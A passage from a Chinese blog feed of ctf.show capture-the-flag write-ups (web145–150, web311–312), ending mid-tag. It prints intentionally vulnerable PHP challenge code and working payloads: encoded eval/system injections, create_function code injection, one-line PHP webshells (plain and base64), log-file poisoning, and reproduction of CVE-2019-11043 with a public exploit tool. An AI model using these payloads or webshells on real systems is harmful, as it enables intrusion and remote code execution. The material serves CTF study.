class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-18 17:41:33</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(&quot;return 1?phpinfo():1;&quot;);</span><br></pre></td></tr></table></figure><p>这样是可以执行phpinfo()的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5):&amp;v2=1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410180200072.png" alt="image-20220410180200072"></p><h1 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-18 17:41:33</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>冒号被过滤了,我们使用||运算符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(&quot;return 1==phpinfo()||1;&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)|</span><br><span class="line">?v1=1&amp;v2=1&amp;v3===(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)|</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410181231207.png" alt="image-20220410181231207"></p><h1 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h1><h2 id="create-function-代码注入"><a href="#create-function-代码注入" class="headerlink" title="create_function()代码注入"></a>create_function()代码注入</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-19 02:04:38</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;echo $a.&quot;123&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">类似于</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么如果我们第二个参数传入 echo 1;}phpinfo();&#x2F;&#x2F;<br> 就等价于</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="number">1</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line">从而执行<span class="title function_ invoke__">phpinfo</span>()命令</span><br></pre></td></tr></table></figure><p>fuzz后发现%5c可以绕过这个正则表达式，具体原理可以看下<a href="https://paper.seebug.org/755/">这篇文章</a><br> 这样我们就可以执行任意命令了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?show=echo 123;&#125;eval($_POST[&#x27;zf&#x27;]);//</span><br><span class="line">POST</span><br><span class="line">ctf=%5ccreate_function&amp;zf=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410181723737.png" alt="image-20220410181723737"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410181826109.png" alt="image-20220410181826109"></p><h1 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h1><h2 id="中文变量"><a href="#中文变量" class="headerlink" title="中文变量"></a>中文变量</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-19 03:52:11</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>异或</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;);</span><br></pre></td></tr></table></figure><p>中文变量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=$哈=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; 异或出来的结果是 _GET</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410182722686.png" alt="image-20220410182722686"></p><h1 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h1><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-19 04:34:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接往index.php写一句话</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctf=index.php</span><br><span class="line">POST</span><br><span class="line">show=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410183026874.png" alt="image-20220410183026874"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410183042445.png" alt="image-20220410183042445"></p><p>条件竞争</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf=1.php</span><br><span class="line">show=&lt;?php system(&#x27;tac /c*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><h1 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-19 07:12:57</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>日志文件包含写一句话 .修改user_agent内容为一句话，然后包含&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log就可以使用我们写的一句话了。首先访问index.php 修改user_agent为一句话.然后包含日志文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410183545029.png" alt="image-20220410183545029"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410183654636.png" alt="image-20220410183654636"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410183720433.png" alt="image-20220410183720433"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpCVE</title>
      <link href="/ctfshow/ctf.show/phpCVE/"/>
      <url>/ctfshow/ctf.show/phpCVE/</url>
      
        <content type="html"><![CDATA[<h1 id="web311"><a href="#web311" class="headerlink" title="web311"></a>web311</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272022744.png" alt="image-20220327202246716"></p><p>有点熟悉</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272023627.png" alt="image-20220327202304600"></p><p>提示cve,先查看下版本</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272025086.png" alt="image-20220327202509029"></p><p>X-Powered-By:PHP&#x2F;7.1.33dev这个是告知网站是用何种语言或者框架编写的,可以在php.ini中增加或者修改expose_php&#x3D;off进行关闭</p><p>那么这里就需要去寻找这个版本的php漏洞了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272046603.png" alt="image-20220327204633548"></p><p>搜到一个</p><h2 id="CVE-2019-11043复现与学习"><a href="#CVE-2019-11043复现与学习" class="headerlink" title="CVE-2019-11043复现与学习"></a>CVE-2019-11043复现与学习</h2><p>CVE2019-11043是一个远程代码执行漏洞,使用某些特定的Nginx+PHP-FPM的服务器存在漏洞,可以远程代码执行</p><p>向Nginx+PHP-FPM的服务器URL发送%0a时,服务器返回异常,该漏洞需要在nginx.conf中进行特定配置才能出发</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line"> ...</span><br><span class="line"> fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line"> fastcgi_param PATH_INFO $fastcgi_path_info;</span><br><span class="line"> fastcgi_pass   php:9000;</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PHP的很多框架里面都是通过获取$_SERVER[‘PATH_INFO’]处理路由,这个变量是通过nginx传递过来的,我们在nginx中经常见到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastcgi_split_path_info ^(.+\.php)(/.*)$;</span><br><span class="line">fastcgi_param PATH_INFO $fastcgi_path_info;</span><br></pre></td></tr></table></figure><p>nginx默认获取不到PATH_INFO的值,得通过fastcgi_split_path_info指定的正则表达式来获取值,^(.+.php)(&#x2F;.*)$;增正则表达式有两个括号,也就是有两个捕获,第二个捕获到的值会自动重新赋值给$fastcgi_path_info变量,第一个捕获到的值会重新赋值给$fastcgi_script_name变量.</p><p>如果访问.index.php&#x2F;test,第二个捕获的是&#x2F;test $fastcgi_path_info就是&#x2F;test,因此就会把&#x2F;test传递给php的$SERVER[‘PATH_INFO’]</p><p>回到本题,这里可以使用换行符(%0a)来破坏fastcgi_split_path_info指令中的Regexp.Regexp被破坏导致PATH_INFO为空,从而触发该漏洞</p><p>开启docker环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272126792.png" alt="image-20220327212614758"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272127784.png" alt="image-20220327212708758"></p><p>访问成功,利用 先安装go环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install golang#安装go语言</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn  #换一下国内镜像源</span><br><span class="line">git clone https://github.com/neex/phuip-fpizdam.git#下载工具</span><br><span class="line">cd phuip-fpizdam进入目录</span><br><span class="line">go get -v &amp;&amp; go build#应该是编译代码(我也不知道)</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272129299.png" alt="image-20220327212937245"></p><p>利用</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272130037.png" alt="image-20220327213043987"></p><p>自己读一下显示信息就可以发现传a参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272132391.png" alt="image-20220327213224340"></p><p>这里本地就复现成功了,但是没有反弹shell,这里才测试一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272201489.png" alt="image-20220327220145421"></p><p>远程有点慢,多等等</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272202095.png" alt="image-20220327220209056"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272202925.png" alt="image-20220327220233885"></p><p><strong>反弹shell</strong></p><p>这里面没有nc的命令.所以不能用nc的反弹shell</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272137861.png" alt="image-20220327213700809"></p><p>给此docker容器装一个nc</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272139532.png" alt="image-20220327213917487"></p><p>环境有两个 docker 镜像，一个是nginx，一个是 php</p><p>进入nginx的容器</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272141474.png" alt="image-20220327214132404"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272142790.png" alt="image-20220327214222725"></p><p>装好了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272144138.png" alt="image-20220327214456106"></p><p>远程执行nc 本地监听端口</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272145649.png" alt="image-20220327214506625"></p><p>执行之后发现并没有成功</p><p>接着在php镜像里面再次尝试</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272149447.png" alt="image-20220327214953377"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272150448.png" alt="image-20220327215011377"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272151414.png" alt="image-20220327215129345"></p><p>发现成功了</p><p>反弹shell试试</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272152368.png" alt="image-20220327215256336"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272153989.png" alt="image-20220327215303963"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272154150.png" alt="image-20220327215404083"></p><h1 id="web312"><a href="#web312" class="headerlink" title="web312"></a>web312</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311405199.png" alt="image-20220331140540111"></p><p>先给一个正确的服务器地址 返回了php版本</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311406219.png" alt="image-20220331140600102"></p><p>php&#x3D;5.6.38</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311406261.png" alt="image-20220331140639154"></p><p>错误的返回了nginx&#x2F;1.21.1版本</p><p>百度这个版本搜到了这</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311415242.png" alt="image-20220331141557179"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311425393.png" alt="image-20220331142539347"></p><h2 id="CVE-2018-19518复现与学习"><a href="#CVE-2018-19518复现与学习" class="headerlink" title="CVE-2018-19518复现与学习"></a>CVE-2018-19518复现与学习</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311429507.png" alt="image-20220331142924422"></p><p>本地起一下环境,正确的长这样</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311433017.png" alt="image-20220331143317937"></p><p>firefox访问上一个环境有缓存了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311434467.png" alt="image-20220331143400397"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311434519.png" alt="image-20220331143428435"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311434019.png" alt="image-20220331143449921"></p><p>对自己想要发的内容进行一次base64编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[zf]);?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHAgQGV2YWwoJF9QT1NUW3pmXSk7Pz4=</span><br></pre></td></tr></table></figure><p>将文件写入zf.php</p><figure class="highlight plaintext"><table><tr><td 